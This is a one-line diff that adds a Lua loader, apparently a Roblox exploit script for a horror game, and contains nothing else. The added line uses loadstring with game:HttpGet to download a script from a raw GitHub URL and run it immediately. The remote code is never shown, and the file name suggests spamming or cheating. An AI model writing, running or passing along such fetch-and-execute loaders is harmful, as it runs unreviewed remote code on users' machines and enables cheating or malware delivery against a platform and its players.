@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/it-wants-in-horror-spam0-5nb3oxasky4esv.lua"))()
